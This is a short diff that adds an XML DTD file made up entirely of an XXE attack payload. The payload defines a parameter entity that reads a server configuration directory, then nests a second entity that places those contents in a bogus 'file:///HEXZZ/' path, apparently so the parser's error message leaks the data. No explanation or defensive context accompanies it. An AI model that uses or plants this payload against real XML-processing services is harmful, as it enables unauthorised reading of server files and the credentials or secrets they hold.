@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:/opt/out/instance/server/default/conf/">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///HEXZZ/%file;'>">
+%eval;
+%exfil;
